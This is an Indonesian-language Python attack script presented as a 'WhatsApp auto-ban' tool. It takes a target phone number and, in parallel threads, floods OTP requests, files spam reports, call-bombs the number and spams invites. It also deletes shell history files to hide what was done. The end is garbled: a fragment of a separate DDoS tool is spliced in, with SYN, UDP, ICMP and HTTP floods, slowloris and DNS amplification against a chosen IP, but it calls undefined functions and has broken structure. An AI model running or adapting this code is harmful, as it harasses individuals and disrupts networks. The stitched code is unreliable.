      #!/usr/bin/env python3
import requests
import random
import time
import threading
import os
import sys
import subprocess

# ========== CLEAR HISTORY & HIDE JEJAK ==========
os.system("clear")
os.system("history -c 2>/dev/null")
os.system("rm -f ~/.bash_history ~/.python_history ~/.*_history 2>/dev/null")
os.system("echo '' > ~/.bash_history")

# ========== ASCII BANNER ==========
banner = f"""
\033[95m
╔══════════════════════════════════════════════════════════╗
║                                                          ║
║   ██╗    ██╗ █████╗     ██████╗  █████╗ ███╗   ██╗      ║
║   ██║    ██║██╔══██╗    ██╔══██╗██╔══██╗████╗  ██║      ║
║   ██║ █╗ ██║███████║    ██████╔╝███████║██╔██╗ ██║      ║
║   ██║███╗██║██╔══██║    ██╔══██╗██╔══██║██║╚██╗██║      ║
║   ╚███╔███╔╝██║  ██║    ██████╔╝██║  ██║██║ ╚████║      ║
║    ╚══╝╚══╝ ╚═╝  ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝      ║
║                                                          ║
║         \033[93mWHATSAPP AUTO-BAN TOOL v3.0\033[95m                ║
║            \033[91m[ THE OBSIDIAN RECKONING ]\033[95m               ║
╚══════════════════════════════════════════════════════════╝
\033[0m
"""
print(banner)

# ========== ANIMASI LOADING ==========
def loading_animation():
    chars = "░▒▓█▉▊▋▌▍▎▏"
    for i in range(20):
        sys.stdout.write(f"\r\033[96m[!] Initializing\033[0m {chars[i % len(chars)] * (i//2)}")
        sys.stdout.flush()
        time.sleep(0.05)
    print("\n")

loading_animation()

# ========== INPUT NOMOR ==========
print("\033[90m" + "─" * 54 + "\033[0m")
print("\033[93m[\033[96m*\033[93m] MASUKKAN NOMOR TARGET\033[0m")
print("\033[90m" + "─" * 54 + "\033[0m")
print("\033[97m    Format internasional:\033[0m")
print("    \033[90m•\033[0m 6281234567890")
print("    \033[90m•\033[0m +6281234567890") 
print("    \033[90m•\033[0m 081234567890")
print("\033[90m" + "─" * 54 + "\033[0m")

target = input("\n\033[93m➜\033[96m Target nomor:\033[0m ").strip()

# Format otomatis
target = target.replace("+", "").replace(" ", "").replace("-", "")
if target.startswith("08"):
    target = "62" + target[1:]
elif not target.startswith("62"):
    target = "62" + target

print("\n\033[90m" + "─" * 54 + "\033[0m")
print(f"\033[92m✓\033[0m Target ditetapkan: \033[97m{target}\033[0m")
print("\033[90m" + "─" * 54 + "\033[0m\n")

# ========== KONFIGURASI ==========
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15",
    "WhatsApp/2.22.16.12 Android",
    "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36"
]

attack_count = {"report": 0, "otp": 0, "call": 0, "invite": 0}

# ========== FUNGSI SERANGAN ==========
def report_spam():
    endpoints = [
        "https://web.whatsapp.com/security/report",
        "https://api.whatsapp.com/v1/report"
    ]
    payload = {"jid": f"{target}@s.whatsapp.net", "reason": "spam_messages"}
    for url in endpoints:
        try:
            requests.post(url, json=payload, timeout=2, headers={"User-Agent": random.choice(user_agents)})
            attack_count["report"] += 1
            print(f"\033[91m[⚠]\033[0m Report spam → \033[90m{url[:30]}...\033[0m")
        except:
            pass

def flood_verification():
    wa_url = "https://web.whatsapp.com/register/request"
    for _ in range(20):
        try:
            requests.post(wa_url, data={"phone": target, "method": "sms"}, timeout=1)
            attack_count["otp"] += 1
            print(f"\033[93m[📱]\033[0m OTP flood → \033[97m{target}\033[0m")
        except:
            pass
        time.sleep(0.2)

def call_bomb():
    if os.system("which termux-telephony-call > /dev/null 2>&1") == 0:
        for i in range(30):
            os.system(f"termux-telephony-call {target} 2>/dev/null")
            attack_count["call"] += 1
            print(f"\033[94m[📞]\033[0m Call bomb → \033[97m{target}\033[0m (\033[90m{i+1}/30\033[0m)")
            time.sleep(0.15)
    else:
        print("\033[90m[!] Termux API tidak tersedia → skip call bomb\033[0m")

def invite_spam():
    for _ in range(15):
        try:
            requests.post("https://chat.whatsapp.com/invite", 
                         data={"phone": target, "code": "ABCDEF" + str(random.randint(100,999))},
                         timeout=1)
            attack_count["invite"] += 1
            print(f"\033[92m[📨]\033[0m Spam undangan → \033[97m{target}\033[0m")
        except:
            pass
        time.sleep(0.1)

# ========== STATISTIK REAL-TIME ==========
def show_stats():
    print("\n\033[90m" + "─" * 54 + "\033[0m")
    print(f"\033[96m📊 STATUS SERANGAN:\033[0m")
    print(f"   \033[91mReport\033[0m    : \033[97m{attack_count['report']}\033[0m")
    print(f"   \033[93mOTP\033[0m       : \033[97m{attack_count['otp']}\033[0m")
    print(f"   \033[94mCall\033[0m      : \033[97m{attack_count['call']}\033[0m")
    print(f"   \033[92mInvite\033[0m    : \033[97m{attack_count['invite']}\033[0m")
    print(f"   \033[95mTotal\033[0m     : \033[93m{sum(attack_count.values())}\033[0m")
    print("\033[90m" + "─" * 54 + "\033[0m")

# ========== EKSEKUSI ==========
print("\033[96m[🔥] Memulai serangan...\033[0m\n")

threads = []
for _ in range(5):
    t = threading.Thread(target=flood_verification)
    t.start()
    threads.append(t)

for _ in range(3):
    t = threading.Thread(target=report_spam)
    t.start()
    threads.append(t)

t = threading.Thread(target=call_bomb)
t.start()
threads.append(t)

for _ in range(3):
    t = threading.Thread(target=invite_spam)
    t.start()
    threads.append(t)

# Timer progress bar
for i in range(30):
    sys.stdout.write(f"\r\033[96m[⏳] Progress\033[0m {'█' * (i//2)}{'░' * (15 - i//2)} \033[93m{i*3}%\033[0m")
    sys.stdout.flush()
    time.sleep(0.3)

for t in threads:
    t.join()

show_stats()

# ========== CLEANUP JEJAK ==========
print("\n\033[93m[🧹] Membersihkan jejak...\033[0m")
os.system("history -c 2>/dev/null")
os.system("rm -f ~/.bash_history ~/.python_history 2>/dev/null")
os.system("echo '' > ~/.bash_history")
os.system("clear")

# ========== OUTPUT AKHIR ==========
final_banner = f"""
\033[95m
╔══════════════════════════════════════════════════════════╗
║                    \033[92m✓ SELESAI ✓\033[95m                       ║
║                                                          ║
║    \033[97mTarget:\033[0m \033[93m{target}\033[95m                           
║    \033[97mTotal serangan:\033[0m \033[93m{sum(attack_count.values())}\033[95m              
║                                                          ║
║    \033[90mCek status nomor dalam 1-24 jam\033[95m                 
╚══════════════════════════════════════════════════════════╝
\033[0m
"""
print(final_banner)  sys.exit()
    
    target_ip = input("\033[96mTarget IP: \033[0m").strip()
    target_port = input("\033[96mTarget Port (default 80): \033[0m").strip() or "80"
    target_port = int(target_port)
    
    threads = int(input("\033[96mJumlah thread (default 500): \033[0m").strip() or "500")
    
    print("\n\033[93m[!] Serangan dimulai! Tekan Ctrl+C untuk berhenti\033[0m\n")
    
    if choice == "1":
        for _ in range(threads):
            threading.Thread(target=syn_flood, args=(target_ip, target_port)).start()
    elif choice == "2":
        for _ in range(threads):
            threading.Thread(target=udp_flood, args=(target_ip, target_port)).start()
    elif choice == "3":
        target_url = f"http://{target_ip}:{target_port}/"
        for _ in range(threads):
            threading.Thread(target=http_flood, args=(target_url,)).start()
    elif choice == "4":
        for _ in range(threads):
            threading.Thread(target=icmp_flood, args=(target_ip,)).start()
    elif choice == "5":
        for _ in range(threads//10):
            threading.Thread(target=slowloris, args=(target_ip, target_port)).start()
    elif choice == "6":
        dns_list = ["8.8.8.8", "1.1.1.1", "208.67.222.222"]
        threading.Thread(target=dns_amp, args=(target_ip, dns_list)).start()
    elif choice == "7":
        for _ in range(threads//4):
            threading.Thread(target=syn_flood, args=(target_ip, target_port)).start()
            threading.Thread(target=udp_flood, args=(target_ip, target_port)).start()
            threading.Thread(target=icmp_flood, args=(target_ip,)).start()
        threading.Thread(target=http_flood, args=(f"http://{target_ip}:{target_port}/",)).start()
    else:
        print("\033[91mPilihan salah!\033[0m")
        continue
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n\033[93m[!] Menghentikan serangan...\033[0m")
        os.system("pkill -f obsidian_ddos")
        break

os.system("history -c && rm ~/.bash_history")
print("\033[91m[+] Selesai. Jejak sudah dibersihkan.\033[0m")
